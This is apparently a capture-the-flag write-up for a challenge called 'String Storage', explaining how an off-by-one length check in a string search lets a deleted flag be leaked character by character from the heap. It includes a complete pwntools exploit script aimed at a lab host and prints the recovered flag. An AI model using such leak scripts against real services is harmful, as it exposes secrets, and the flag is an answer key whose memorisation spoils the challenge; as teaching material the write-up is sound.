# String Storage

## Challenge

We are provided source for a program which allows users to:

- Add strings to a data structure.
- Search strings in the data structure.
- Remove strings from the data structure.

In the `main` function, the flag is added and removed during setup:

```c
int main() {
    stringArea = malloc(MAXENTRYSIZE * 16);
    
    add_entry("Test entry one\n");
    add_entry("Test entry two\n");
    add_entry("Test entry three\n");
    add_entry("Yet another test entry here!\n");

#ifdef PREPPUZZLE
    // add_entry("TEST\n");
    add_entry(CTFKEY);
    remove_entry(CTFKEY);

#endif
    
    while(1){
        process_user_input();
    }

    return 0;
}
```

We are tasked with recovering this `CTFKEY` value.

## Solution

As source is provided, it can be quite helpful to build the program with debugging symbols and macros
enabled.

Analyzing the program, statically or dynamically, we can see that all strings are added to the same
char buffer on the heap.
The strings are adjacent to eachother, with no null-bytes separating them.
A linked-list contains the start of each string and it's length, so the program can keep track of
where each individual item is.

When running the program, we can see that if we try to search for a string that we know exists, the
program likely returns "no match found".
We can also see the following comment in the source code:

```c
// loop through all the entries and print if there are any matches
//DEVELOLPER NOTE: this seems broken.....
```

By analyzing the source code, or by dynamically analyzing the program during a search, we can find
that the program is searching 1 character longer than expected.

```c
int entry_len = current->entry_size + 1;
```

This means that the program is checking 1 character into the next string.

Since the `CTFKEY` is preceeded by "Yet another test entry here!", we can start by searching this
string, with 1 char appended to it, which will be our guess.
We can keep searching with difference guesses until we find the correct one, which will be the first
character of the flag.

To move to the next character, we know that the flag has been deleted, so any strings we add will
start to overwrite it on the heap.
If we add a string of length 1, we can use it as the start of our next searches.
For example, we can add "a", then search with "aa", "ab"... until we find the next letter.
Because the length and content must match for a search, it does not matter if the letter we choose
collides with a letter in the setup, as the setup does not include strings of length 1.

For subsequent characters, we can continue to add length 1 strings and repeat the steps above.
The only condition is that we do not reuse a letter that was already used as a starting point.
This is to avoid collusions.

We can repeat this procedure until we have discovered all the characters.
This will be indicated when we run through our entire alphabet for an index without a match.
We will then know that we have leaked the entire secret value.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 10.0.2.43 --port 10001 a.out
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('a.out')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '10.0.2.43'
port = int(args.PORT or 10001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_{}"
flag = ""

io = start()

for c in alphabet:
    test = f"Yet another test entry here!{c}"
    print(test)
    io.sendlineafter(b":\n", b"search")
    io.sendlineafter(b"?\n", test.encode())
    res = io.recvuntil(b'found')
    print(res)
    if b'\nno' not in res:
        flag += c
        break

dummy = 0x30

while True:
    io.sendlineafter(b":\n", b"add")
    io.sendlineafter(b"?\n", chr(dummy).encode())
    for c in alphabet:
        test = f"{chr(dummy)}{c}"
        print(test)
        io.sendlineafter(b":\n", b"search")
        io.sendlineafter(b"?\n", test.encode())
        res = io.recvuntil(b'found')
        if b'\nno' not in res:
            flag += c
            dummy += 1
            print("flag:" + flag)
            print("dummy:" + str(dummy))
            print(io.recvuntil(b'\t').decode())
            break
    else:
        break

io.interactive()
```

## Flag

```
electric-DISCOVER-students
```
